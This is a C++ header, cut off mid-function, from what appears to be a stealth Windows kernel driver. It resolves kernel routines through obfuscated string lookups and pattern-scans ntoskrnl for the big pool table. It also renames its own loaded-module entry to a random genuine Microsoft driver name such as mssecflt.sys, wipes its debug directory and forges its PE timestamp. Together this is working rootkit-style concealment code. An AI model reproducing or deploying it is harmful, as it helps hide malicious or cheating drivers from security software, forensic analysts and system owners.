#pragma once

#include <ntifs.h>
#include <ntimage.h>
#include "../imports/Defs.h"
#include "../imports/Strings.h"
#include "CoreSecurity.h"

namespace stealth {
    inline BOOLEAN (NTAPI* _ExAcquireResourceExclusiveLite)(PVOID Resource, BOOLEAN Wait) = nullptr;
    inline BOOLEAN (NTAPI* _ExAcquireResourceSharedLite)(PVOID Resource, BOOLEAN Wait) = nullptr;
    inline VOID    (NTAPI* _ExReleaseResourceLite)(PVOID Resource) = nullptr;
    inline VOID    (NTAPI* _KeEnterCriticalRegion)() = nullptr;
    inline VOID    (NTAPI* _KeLeaveCriticalRegion)() = nullptr;
    inline PVOID   (NTAPI* _ExAllocatePoolWithTag)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag) = nullptr;
    inline VOID    (NTAPI* _ExFreePoolWithTag)(PVOID P, ULONG Tag) = nullptr;
    inline PVOID   g_PsLoadedModuleResource = nullptr;

    inline volatile ULONG g_NtBuildNumber = 0;
    inline volatile LONG g_VersionResolved = 0;

    __forceinline ULONG elapsed_us(const LARGE_INTEGER& start, const LARGE_INTEGER& freq) {
        LARGE_INTEGER now = KeQueryPerformanceCounter(nullptr);
        if (freq.QuadPart <= 0 || now.QuadPart < start.QuadPart)
            return 0;
        return static_cast<ULONG>(((now.QuadPart - start.QuadPart) * 1000000ULL) / static_cast<ULONGLONG>(freq.QuadPart));
    }

    __forceinline void passive_backoff_100ns(LONG64 relative_interval) {
        if (_KeDelayExecutionThread && KeGetCurrentIrql() == PASSIVE_LEVEL) {
            LARGE_INTEGER wait;
            wait.QuadPart = relative_interval;
            _KeDelayExecutionThread(KernelMode, FALSE, &wait);
        } else {
            YieldProcessor();
        }
    }

    __forceinline BOOLEAN wait_for_state(volatile LONG* state, LONG ready_value, const char* label) {
        for (ULONG wait = 0; wait < 400; ++wait) {
            LONG current = _InterlockedCompareExchange(state, ready_value, ready_value);
            if (current == ready_value)
                return TRUE;
            if (wait < 4 || wait == 8 || wait == 16 || wait == 32 || (wait % 64) == 0) {
                WW_LOG("stealth::state_wait label=%s wait=%lu current=%ld ready=%ld",
                    label ? label : "unknown",
                    wait,
                    current,
                    ready_value);
            }
            passive_backoff_100ns(-10000LL);
        }
        WW_LOG("stealth::state_wait_timeout label=%s current=%ld ready=%ld",
            label ? label : "unknown",
            _InterlockedCompareExchange(state, ready_value, ready_value),
            ready_value);
        return FALSE;
    }

    __forceinline UINT64 handle_to_u64(HANDLE value) {
        return static_cast<UINT64>(reinterpret_cast<ULONG_PTR>(value));
    }

    __forceinline HANDLE registered_client_pid_snapshot() {
        return reinterpret_cast<HANDLE>(
            _InterlockedCompareExchange64(
                reinterpret_cast<volatile LONG64*>(&caller_validation::g_registered_client_pid),
                0,
                0));
    }

    __forceinline BOOLEAN registered_client_is_live(HANDLE pid, NTSTATUS* lookup_status) {
        if (lookup_status)
            *lookup_status = STATUS_INVALID_PARAMETER;
        if (!pid)
            return FALSE;

        LONG validation = _InterlockedCompareExchange(&caller_validation::g_validation_enabled, 0, 0);
        if (validation == 0)
            return FALSE;

        if (!_PsLookupProcessByProcessId || !_ObfDereferenceObject) {
            if (lookup_status)
                *lookup_status = STATUS_SUCCESS;
            return TRUE;
        }

        PEPROCESS process = nullptr;
        NTSTATUS status = _PsLookupProcessByProcessId(pid, &process);
        if (lookup_status)
            *lookup_status = status;
        if (NT_SUCCESS(status) && process) {
            _ObfDereferenceObject(process);
            return TRUE;
        }
        return FALSE;
    }

    __forceinline BOOLEAN wait_for_registered_client(const char* phase) {
        for (ULONG poll = 0; poll < 80; ++poll) {
            HANDLE pid = registered_client_pid_snapshot();
            NTSTATUS lookup_status = STATUS_UNSUCCESSFUL;
            BOOLEAN live = registered_client_is_live(pid, &lookup_status);
            LONG validation = _InterlockedCompareExchange(&caller_validation::g_validation_enabled, 0, 0);

            if (live) {
                WW_LOG("stealth_delayed_hide::session phase=%s poll=%lu live=1 pid=%llu validation=%ld lookup=0x%08lx",
                    phase ? phase : "unknown",
                    poll,
                    handle_to_u64(pid),
                    validation,
                    lookup_status);
                return TRUE;
            }

            if (poll < 4 || poll == 8 || poll == 16 || poll == 32 || (poll % 16) == 0) {
                WW_LOG("stealth_delayed_hide::backoff phase=%s poll=%lu live=0 pid=%llu validation=%ld lookup=0x%08lx",
                    phase ? phase : "unknown",
                    poll,
                    handle_to_u64(pid),
                    validation,
                    lookup_status);
            }

            if (!_KeDelayExecutionThread)
                break;
            passive_backoff_100ns(-2500000LL);
        }

        HANDLE final_pid = registered_client_pid_snapshot();
        LONG final_validation = _InterlockedCompareExchange(&caller_validation::g_validation_enabled, 0, 0);
        WW_LOG("stealth_delayed_hide::no_live_client phase=%s pid=%llu validation=%ld",
            phase ? phase : "unknown",
            handle_to_u64(final_pid),
            final_validation);
        return FALSE;
    }

    __forceinline ULONG GetNtBuildNumber() {
        LONG state = _InterlockedCompareExchange(&g_VersionResolved, 0, 0);
        if (state == 2) {
            return g_NtBuildNumber;
        }

        LONG prev = _InterlockedCompareExchange(&g_VersionResolved, 1, 0);
        if (prev == 2) return g_NtBuildNumber;
        if (prev == 1) {
            wait_for_state(&g_VersionResolved, 2, "nt_build");
            return g_NtBuildNumber;
        }

        RTL_OSVERSIONINFOW version_info = { sizeof(RTL_OSVERSIONINFOW) };
        if (_RtlGetVersion && NT_SUCCESS(_RtlGetVersion(&version_info))) {
            g_NtBuildNumber = version_info.dwBuildNumber;
        } else {
            g_NtBuildNumber = 0;
        }

        KeMemoryBarrier();
        _InterlockedExchange(&g_VersionResolved, 2);
        return g_NtBuildNumber;
    }

    __forceinline BOOLEAN IsWindows11() {
        return GetNtBuildNumber() >= 22000;
    }

    __forceinline BOOLEAN IsNtBuildKnown() {
        return GetNtBuildNumber() != 0;
    }

    __forceinline BOOLEAN IsWindows11_24H2OrNewer() {
        return GetNtBuildNumber() >= 26100;
    }

    typedef struct _POOL_TRACKER_BIG_PAGES {
        volatile ULONGLONG Va;
        ULONG Key;
        ULONG Pattern : 8;
        ULONG PoolType : 12;
        ULONG SlushSize : 12;
        ULONGLONG NumberOfBytes;
    } POOL_TRACKER_BIG_PAGES, *PPOOL_TRACKER_BIG_PAGES;

    inline PPOOL_TRACKER_BIG_PAGES* g_PoolBigPageTable = nullptr;
    inline SIZE_T* g_PoolBigPageTableSize = nullptr;
    inline SIZE_T g_BigPoolEntryStride = sizeof(POOL_TRACKER_BIG_PAGES);
    inline volatile LONG g_BigPoolResolved = 0;

    inline bool SetupStealthFunctions() {
        PVOID kernelBase = (PVOID)get_nt_base();
        if (!kernelBase) return false;

        *(PVOID*)&_ExAcquireResourceExclusiveLite = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExAcquireResourceExclusiveLite"));
        *(PVOID*)&_ExAcquireResourceSharedLite = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExAcquireResourceSharedLite"));
        *(PVOID*)&_ExReleaseResourceLite          = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExReleaseResourceLite"));
        *(PVOID*)&_KeEnterCriticalRegion          = GetProcAddress(kernelBase, (PCHAR)skCrypt("KeEnterCriticalRegion"));
        *(PVOID*)&_KeLeaveCriticalRegion          = GetProcAddress(kernelBase, (PCHAR)skCrypt("KeLeaveCriticalRegion"));
        *(PVOID*)&_ExAllocatePoolWithTag = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExAllocatePoolWithTag"));
        *(PVOID*)&_ExFreePoolWithTag = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExFreePoolWithTag"));

        g_PsLoadedModuleResource = GetProcAddress(kernelBase, (PCHAR)skCrypt("PsLoadedModuleResource"));

        return (_ExAcquireResourceExclusiveLite && _ExAcquireResourceSharedLite &&
                _ExReleaseResourceLite && _KeEnterCriticalRegion && _KeLeaveCriticalRegion);
    }

    typedef struct _MM_UNLOADED_DRIVER {
        UNICODE_STRING Name;
        PVOID          ModuleStart;
        PVOID          ModuleEnd;
        LARGE_INTEGER  UnloadTime;
    } MM_UNLOADED_DRIVER, * PMM_UNLOADED_DRIVER;


    inline PVOID FindPattern(PVOID base, SIZE_T size, const UCHAR* pattern, const char* mask) {
        SIZE_T maskLen = 0;
        while (mask[maskLen]) maskLen++;

        if (!base || !pattern || size < maskLen)
            return nullptr;

        const UCHAR* data = static_cast<const UCHAR*>(base);
        constexpr SIZE_T pageSize = 0x1000;

        for (SIZE_T i = 0; i <= size - maskLen; ) {

            ULONG_PTR currentAddr = reinterpret_cast<ULONG_PTR>(data + i);
            ULONG_PTR currentPage = currentAddr & ~(pageSize - 1);

            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(currentPage))) {

                ULONG_PTR nextPage = currentPage + pageSize;
                SIZE_T skip = nextPage - currentAddr;
                i += skip;
                continue;
            }


            ULONG_PTR pageEnd = currentPage + pageSize;
            SIZE_T maxIndexThisPage = pageEnd - reinterpret_cast<ULONG_PTR>(data);
            if (maxIndexThisPage > size) maxIndexThisPage = size;


            for (; i <= maxIndexThisPage - maskLen && i <= size - maskLen; ++i) {
                bool hit = true;
                for (SIZE_T j = 0; j < maskLen; ++j) {
                    if (mask[j] == 'x' && data[i + j] != pattern[j]) {
                        hit = false;
                        break;
                    }
                }
                if (hit)
                    return const_cast<UCHAR*>(&data[i]);
            }
        }
        return nullptr;
    }


    __forceinline PVOID ResolveRelative(PVOID insn, ULONG dispOffset, ULONG insnSize) {
        if (!insn)
            return nullptr;

        UCHAR* p = static_cast<UCHAR*>(insn);


        PVOID dispAddr = p + dispOffset;
        if (!_MmIsAddressValid(dispAddr))
            return nullptr;

        INT32 disp = *reinterpret_cast<INT32*>(dispAddr);
        return p + insnSize + disp;
    }

    inline bool GetNtTextSection(PVOID ntBase, PVOID* outBase, SIZE_T* outSize) {
        auto dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

        auto nt = reinterpret_cast<PIMAGE_NT_HEADERS64>((UCHAR*)ntBase + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE)  return false;

        auto sec = IMAGE_FIRST_SECTION(nt);
        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                *outBase = (PVOID)((UCHAR*)ntBase + sec[i].VirtualAddress);
                *outSize = sec[i].Misc.VirtualSize;
                return true;
            }
        }
        return false;
    }

    inline ULONG GetExecutableSections(PVOID moduleBase, PVOID* bases, SIZE_T* sizes, ULONG maxSections) {
        if (!moduleBase || !bases || !sizes || maxSections == 0)
            return 0;

        auto dos = static_cast<PIMAGE_DOS_HEADER>(moduleBase);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

        auto nt = reinterpret_cast<PIMAGE_NT_HEADERS64>((UCHAR*)moduleBase + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

        ULONG count = 0;
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections && count < maxSections; i++) {
            if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && sec[i].Misc.VirtualSize > 0) {
                bases[count] = (PVOID)((UCHAR*)moduleBase + sec[i].VirtualAddress);
                sizes[count] = sec[i].Misc.VirtualSize;
                count++;
            }
        }
        return count;
    }

    inline PVOID FindPatternSafe(PVOID base, SIZE_T size, const UCHAR* pattern, const char* mask) {
        SIZE_T maskLen = 0;
        while (mask[maskLen]) maskLen++;

        if (!base || !pattern || size < maskLen)
            return nullptr;

        const UCHAR* data = static_cast<const UCHAR*>(base);
        SIZE_T pageSize = 0x1000;

        for (SIZE_T i = 0; i <= size - maskLen; ) {
            SIZE_T currentPage = (reinterpret_cast<ULONG_PTR>(data + i)) & ~(pageSize - 1);
            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(currentPage))) {
                SIZE_T nextPage = currentPage + pageSize;
                SIZE_T skip = nextPage - reinterpret_cast<ULONG_PTR>(data + i);
                i += skip;
                continue;
            }

            SIZE_T pageEnd = currentPage + pageSize - reinterpret_cast<ULONG_PTR>(data);
            if (pageEnd > size) pageEnd = size;

            if (pageEnd < maskLen) {
                i = pageEnd;
                continue;
            }

            for (; i <= pageEnd - maskLen && i <= size - maskLen; ++i) {
                bool hit = true;
                for (SIZE_T j = 0; j < maskLen; ++j) {
                    if (mask[j] == 'x' && data[i + j] != pattern[j]) {
                        hit = false;
                        break;
                    }
                }
                if (hit)
                    return const_cast<UCHAR*>(&data[i]);
            }


            if (pageEnd < size && i < pageEnd)
                i = pageEnd;
        }
        return nullptr;
    }

    inline PVOID FindPatternInAllSections(PVOID moduleBase, const UCHAR* pattern, const char* mask) {
        PVOID bases[16];
        SIZE_T sizes[16];
        ULONG count = GetExecutableSections(moduleBase, bases, sizes, 16);
        if (count == 0) return nullptr;

        for (ULONG s = 0; s < count; s++) {
            PVOID result = FindPatternSafe(bases[s], sizes[s], pattern, mask);
            if (result) return result;
        }
        return nullptr;
    }

    inline PVOID FindPatternFromInAllSections(PVOID moduleBase, SIZE_T globalStartOffset, const UCHAR* pattern, const char* mask) {
        PVOID bases[16];
        SIZE_T sizes[16];
        ULONG count = GetExecutableSections(moduleBase, bases, sizes, 16);
        if (count == 0) return nullptr;

        for (ULONG s = 0; s < count; s++) {
            ULONG_PTR secStart = reinterpret_cast<ULONG_PTR>(bases[s]);
            ULONG_PTR modBase = reinterpret_cast<ULONG_PTR>(moduleBase);
            SIZE_T secOffset = secStart - modBase;
            SIZE_T localStart = 0;
            if (globalStartOffset > secOffset)
                localStart = globalStartOffset - secOffset;
            if (localStart >= sizes[s])
                continue;
            PVOID result = FindPatternSafe((UCHAR*)bases[s] + localStart, sizes[s] - localStart, pattern, mask);
            if (result) return result;
        }
        return nullptr;
    }

    __forceinline bool NtSectionContains(PVOID ntBase, PVOID address, SIZE_T bytes, ULONG requiredCharacteristics) {
        if (!ntBase || !address || bytes == 0 || !_MmIsAddressValid(ntBase) || !_MmIsAddressValid(address))
            return false;

        __try {
            PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
            if (dos->e_magic != IMAGE_DOS_SIGNATURE)
                return false;

            PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
                static_cast<UCHAR*>(ntBase) + dos->e_lfanew);
            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
                return false;

            ULONG_PTR target = reinterpret_cast<ULONG_PTR>(address);
            if (target + bytes < target)
                return false;

            PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
            for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
                if ((sections[i].Characteristics & requiredCharacteristics) != requiredCharacteristics)
                    continue;

                SIZE_T sectionSize = sections[i].Misc.VirtualSize;
                if (sectionSize == 0)
                    sectionSize = sections[i].SizeOfRawData;
                if (sectionSize == 0)
                    continue;

                ULONG_PTR start = reinterpret_cast<ULONG_PTR>(ntBase) + sections[i].VirtualAddress;
                ULONG_PTR end = start + sectionSize;
                if (end < start)
                    continue;

                if (target >= start && target + bytes <= end)
                    return true;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    __forceinline bool IsKernelPointerLike(ULONGLONG value) {
        return value == 0 || value == 1 || value >= 0xFFFF800000000000ULL;
    }

    __forceinline bool ValidateBigPoolTableSample(PVOID table, ULONGLONG tableSize) {
        if (!table || tableSize == 0 || tableSize > 0x100000ULL || !_MmIsAddressValid(table))
            return false;

        ULONG probes = tableSize < 64 ? static_cast<ULONG>(tableSize) : 64;
        if (probes == 0)
            return false;

        __try {
            for (ULONG i = 0; i < probes; ++i) {
                volatile UCHAR* entry = static_cast<volatile UCHAR*>(table) + (static_cast<SIZE_T>(i) * 0x20);
                if (!_MmIsAddressValid((PVOID)entry) || !_MmIsAddressValid((PVOID)(entry + 0x1F)))
                    return false;

                ULONGLONG va = *reinterpret_cast<volatile ULONGLONG*>(entry);
                ULONGLONG numberOfBytes = *reinterpret_cast<volatile ULONGLONG*>(entry + 0x10);
                if (!IsKernelPointerLike(va & ~1ULL))
                    return false;
                if (numberOfBytes > 0x100000000ULL)
                    return false;
            }
            return true;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    __forceinline bool ProviderHandleTargetIsSane(PVOID ntBase, PVOID handle, UINT64* currentValue) {
        if (currentValue)
            *currentValue = 0;
        if (!handle || (reinterpret_cast<ULONG_PTR>(handle) & (sizeof(UINT64) - 1)) != 0)
            return false;
        if (!NtSectionContains(ntBase, handle, sizeof(UINT64), IMAGE_SCN_MEM_WRITE))
            return false;

        __try {
            UINT64 value = *static_cast<volatile UINT64*>(handle);
            if (currentValue)
                *currentValue = value;
            return value == 0 || value >= 0xFFFF800000000000ULL;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    __forceinline bool SafeWriteMemory(PVOID dest, PVOID src, SIZE_T len) {
        if (!dest || len == 0 || !_MmIsAddressValid(dest))
            return false;

        if (!_IoAllocateMdl || !_IoFreeMdl || !_MmProbeAndLockPages ||
            !_MmUnlockPages || !_MmMapLockedPagesSpecifyCache || !_MmUnmapLockedPages)
            return false;

        PMDL mdl = _IoAllocateMdl(dest, (ULONG)len, FALSE, FALSE, nullptr);
        if (!mdl)
            return false;

        __try {
            _MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            _IoFreeMdl(mdl);
            return false;
        }

        PVOID mapped = nullptr;
        __try {
            mapped = _MmMapLockedPagesSpecifyCache(
                mdl,
                KernelMode,
                MmCached,
                nullptr,
                FALSE,
                NormalPagePriority
            );
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return false;
        }

        if (!mapped) {
            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return false;
        }

        __try {
            if (src) {
                volatile UCHAR* d = static_cast<volatile UCHAR*>(mapped);
                volatile UCHAR* s = static_cast<volatile UCHAR*>(src);
                for (SIZE_T i = 0; i < len; i++)
                    d[i] = s[i];
            } else {
                volatile UCHAR* d = static_cast<volatile UCHAR*>(mapped);
                for (SIZE_T i = 0; i < len; i++)
                    d[i] = 0;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            _MmUnmapLockedPages(mapped, mdl);
            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return false;
        }

        _MmUnmapLockedPages(mapped, mdl);
        _MmUnlockPages(mdl);
        _IoFreeMdl(mdl);
        return true;
    }

    __forceinline void SecureZero(PVOID dest, SIZE_T len) {
        if (!dest || len == 0)
            return;

        SafeWriteMemory(dest, nullptr, len);
    }

    __forceinline USHORT safe_wcslen(const wchar_t* s) {
        if (!s) return 0;
        USHORT len = 0;
        while (s[len] && len < 260) len++;
        return len;
    }

    inline bool DisguiseModuleEntry(PDRIVER_OBJECT DriverObject) {
        if (!DriverObject || !DriverObject->DriverSection)
            return false;

        auto entry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);

        entry->Flags |= 0x20u;

        struct DisguiseName {
            const wchar_t* base;
            const wchar_t* full;
        };

        static const DisguiseName candidates[] = {
            { L"hwpolicy.sys",  L"\\SystemRoot\\System32\\drivers\\hwpolicy.sys"  },
            { L"mssecflt.sys",  L"\\SystemRoot\\System32\\drivers\\mssecflt.sys"  },
            { L"wmiacpi.sys",   L"\\SystemRoot\\System32\\drivers\\wmiacpi.sys"   },
            { L"mshidkmdf.sys", L"\\SystemRoot\\System32\\drivers\\mshidkmdf.sys" },
            { L"mouhid.sys",    L"\\SystemRoot\\System32\\drivers\\mouhid.sys"    },
            { L"kbdhid.sys",    L"\\SystemRoot\\System32\\drivers\\kbdhid.sys"    },
            { L"umpass.sys",    L"\\SystemRoot\\System32\\drivers\\umpass.sys"    },
            { L"swenum.sys",    L"\\SystemRoot\\System32\\drivers\\swenum.sys"    },
            { L"rdpbus.sys",    L"\\SystemRoot\\System32\\drivers\\rdpbus.sys"    },
            { L"hidparse.sys",  L"\\SystemRoot\\System32\\drivers\\hidparse.sys"  },
            { L"winhv.sys",     L"\\SystemRoot\\System32\\drivers\\winhv.sys"     },
            { L"pcw.sys",       L"\\SystemRoot\\System32\\drivers\\pcw.sys"       },
        };
        constexpr int NUM_CANDIDATES = 12;

        bool taken[NUM_CANDIDATES] = { false };

        PLIST_ENTRY start = &entry->InLoadOrderModuleList;
        PLIST_ENTRY cur = start->Flink;
        ULONG safety = 2048;

        while (cur && cur != start && safety-- > 0) {
            if (!_MmIsAddressValid(cur))
                break;

            __try {
                auto other = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);

                if (other != entry &&
                    _MmIsAddressValid(other) &&
                    other->DllBase && _MmIsAddressValid(other->DllBase) &&
                    other->BaseDllName.Buffer &&
                    other->BaseDllName.Length > 0 &&
                    other->BaseDllName.Length < 512 &&
                    _MmIsAddressValid(other->BaseDllName.Buffer)) {

                    USHORT nameChars = other->BaseDllName.Length / sizeof(wchar_t);

                    for (int i = 0; i < NUM_CANDIDATES; i++) {
                        if (!taken[i]) {
                            USHORT candChars = safe_wcslen(candidates[i].base);
                            if (nameChars == candChars) {
                                bool match = true;
                                for (USHORT j = 0; j < nameChars; j++) {
                                    if (locase_w(other->BaseDllName.Buffer[j]) != locase_w(candidates[i].base[j])) {
                                        match = false;
                                        break;
                                    }
                                }
                                if (match) taken[i] = true;
                            }
                        }
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
            }

            cur = cur->Flink;
        }

        int available_count = 0;
        int available_indices[NUM_CANDIDATES];
        for (int i = 0; i < NUM_CANDIDATES; i++) {
            if (!taken[i]) {
                available_indices[available_count++] = i;
            }
        }

        int chosen = -1;
        if (available_count > 0) {
            UINT64 entropy = __rdtsc();
            entropy ^= entropy >> 17;
            entropy *= 0x2545F4914F6CDD1DULL;
            entropy ^= entropy >> 47;
            chosen = available_indices[entropy % available_count];
        }
        if (chosen < 0) chosen = 0;

        const wchar_t* newBase = candidates[chosen].base;
        const wchar_t* newFull = candidates[chosen].full;
        USHORT newBaseChars = safe_wcslen(newBase);
        USHORT newFullChars = safe_wcslen(newFull);
        USHORT newBaseLenBytes = newBaseChars * sizeof(wchar_t);
        USHORT newFullLenBytes = newFullChars * sizeof(wchar_t);

        if (entry->BaseDllName.Buffer && _MmIsAddressValid((PVOID)entry->BaseDllName.Buffer)) {
            SafeWriteMemory(entry->BaseDllName.Buffer, nullptr, entry->BaseDllName.MaximumLength);
            if (newBaseLenBytes + sizeof(wchar_t) <= entry->BaseDllName.MaximumLength) {
                SafeWriteMemory(entry->BaseDllName.Buffer, (PVOID)newBase, newBaseLenBytes + sizeof(wchar_t));
                entry->BaseDllName.Length = newBaseLenBytes;
            }
        }

        if (entry->FullDllName.Buffer && _MmIsAddressValid((PVOID)entry->FullDllName.Buffer)) {
            SafeWriteMemory(entry->FullDllName.Buffer, nullptr, entry->FullDllName.MaximumLength);
            if (newFullLenBytes + sizeof(wchar_t) <= entry->FullDllName.MaximumLength) {
                SafeWriteMemory(entry->FullDllName.Buffer, (PVOID)newFull, newFullLenBytes + sizeof(wchar_t));
                entry->FullDllName.Length = newFullLenBytes;
            }
        }

        return true;
    }

    inline bool ScrubPEMetadata(PDRIVER_OBJECT DriverObject) {
        if (!DriverObject || !DriverObject->DriverSection)
            return false;

        auto entry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
        PVOID base = entry->DllBase;

        if (!base || !_MmIsAddressValid(base))
            return false;

        __try {
            auto dos = static_cast<PIMAGE_DOS_HEADER>(base);
            if (dos->e_magic != IMAGE_DOS_SIGNATURE)
                return false;

            auto nt = reinterpret_cast<PIMAGE_NT_HEADERS64>((UCHAR*)base + dos->e_lfanew);
            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
                return false;

            if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress &&
                nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size) {
                ULONG dbgRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
                ULONG dbgSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size;
                PVOID debugDir = (PVOID)((UCHAR*)base + dbgRva);
                if (_MmIsAddressValid(debugDir) && dbgSize > 0 && dbgSize < 0x1000) {
                    SafeWriteMemory(debugDir, nullptr, dbgSize);
                }
                UCHAR zeroBuf[8] = { 0 };
                SafeWriteMemory(&nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG], zeroBuf, 8);
            }

            UINT64 tsc_seed = __rdtsc();
            tsc_seed ^= tsc_seed >> 17;
            tsc_seed *= 0x2545F4914F6CDD1DULL;
            static const ULONG plausible_stamps[] = {
                0x614FDB0Au, 0x619F3A68u, 0x62920B7Cu, 0x63DA8CF5u,
                0x6502F7E0u, 0x65C8A03Bu, 0x60B5F2A0u, 0x611E4080u
            };
            ULONG stamp = plausible_stamps[tsc_seed & 0x7];
            SafeWriteMemory(&nt->FileHeader.TimeDateStamp, &stamp, sizeof(stamp));
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return true;
    }

    inline bool ResolveBigPoolTableWin11(PVOID ntBase) {
        if (!ntBase || !_MmIsAddressValid(ntBase)) {
            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable.Win11", "semantic_scan", "win11_bigpool_globals", nullptr, FALSE,
                "ntoskrnl base pointer missing or invalid", "bad_nt_base");
            return false;
        }

        PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable.Win11", "semantic_scan", "win11_bigpool_globals", nullptr, FALSE,
                "ntoskrnl DOS signature invalid", "bad_dos_header");
            return false;
        }

        PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
            static_cast<UCHAR*>(ntBase) + dos->e_lfanew);
        if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE) {
            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable.Win11", "semantic_scan", "win11_bigpool_globals", nullptr, FALSE,
                "ntoskrnl NT signature invalid", "bad_nt_headers");
            return false;
        }

        static const UCHAR patWin11[] = {
            0x48, 0x8B, 0x15, 0x00, 0x00, 0x00, 0x00,
            0x4C, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xD2
        };

        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
        PVOID selectedTablePtr = nullptr;
        SIZE_T* selectedSizePtr = nullptr;
        PVOID selectedTable = nullptr;
        PVOID selectedFound = nullptr;
        ULONGLONG selectedSize = 0;
        ULONG rawCandidates = 0;
        ULONG validCandidates = 0;

        for (USHORT s = 0; s < nt->FileHeader.NumberOfSections; ++s) {
            if (!(sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
                continue;

            PVOID sectionBase = static_cast<UCHAR*>(ntBase) + sections[s].VirtualAddress;
            ULONG sectionSize = sections[s].Misc.VirtualSize;
            ULONG searchOffset = 0;

            for (;;) {
                if (searchOffset >= sectionSize)
                    break;

                PVOID searchBase = static_cast<UCHAR*>(sectionBase) + searchOffset;
                ULONG remaining = sectionSize - searchOffset;
                PVOID found = FindPatternSafe(searchBase, remaining, patWin11, "xxx????xxx????xxx");
                if (!found)
                    break;

                rawCandidates++;
                PVOID tablePtr = ResolveRelative(found, 3, 7);
                PVOID sizePtr = ResolveRelative(static_cast<UCHAR*>(found) + 7, 3, 7);
                bool globalsValid =
                    tablePtr && sizePtr &&
                    NtSectionContains(ntBase, tablePtr, sizeof(PVOID), IMAGE_SCN_MEM_WRITE) &&
                    NtSectionContains(ntBase, sizePtr, sizeof(SIZE_T), IMAGE_SCN_MEM_WRITE) &&
                    reinterpret_cast<ULONG_PTR>(sizePtr) == reinterpret_cast<ULONG_PTR>(tablePtr) + sizeof(PVOID);

                PVOID table = nullptr;
                ULONGLONG tableSize = 0;
                if (globalsValid) {
                    __try {
                        table = *static_cast<PVOID*>(tablePtr);
                        tableSize = *static_cast<SIZE_T*>(sizePtr);
                    } __except (EXCEPTION_EXECUTE_HANDLER) {
                        table = nullptr;
                        tableSize = 0;
                    }
                }

                bool sampleValid = globalsValid && ValidateBigPoolTableSample(table, tableSize);
                WW_LOG("stealth::ResolveBigPoolTableWin11 candidate section=%u found=%p table_ptr=%p size_ptr=%p table=%p size=%llu globals=%u sample=%u raw=%lu valid_count=%lu",
                    s,
                    found,
                    tablePtr,
                    sizePtr,
                    table,
                    static_cast<unsigned long long>(tableSize),
                    globalsValid ? 1u : 0u,
                    sampleValid ? 1u : 0u,
                    rawCandidates,
                    validCandidates + (sampleValid ? 1u : 0u));

                if (sampleValid) {
                    validCandidates++;
                    if (validCandidates == 1) {
                        selectedTablePtr = tablePtr;
                        selectedSizePtr = static_cast<SIZE_T*>(sizePtr);
                        selectedTable = table;
                        selectedSize = tableSize;
                        selectedFound = found;
                    }
                }

                ULONG consumed = static_cast<ULONG>(
                    static_cast<UCHAR*>(found) - static_cast<UCHAR*>(sectionBase)) + 1;
                if (consumed <= searchOffset || consumed >= sectionSize)
                    break;
                searchOffset = consumed;
            }
        }

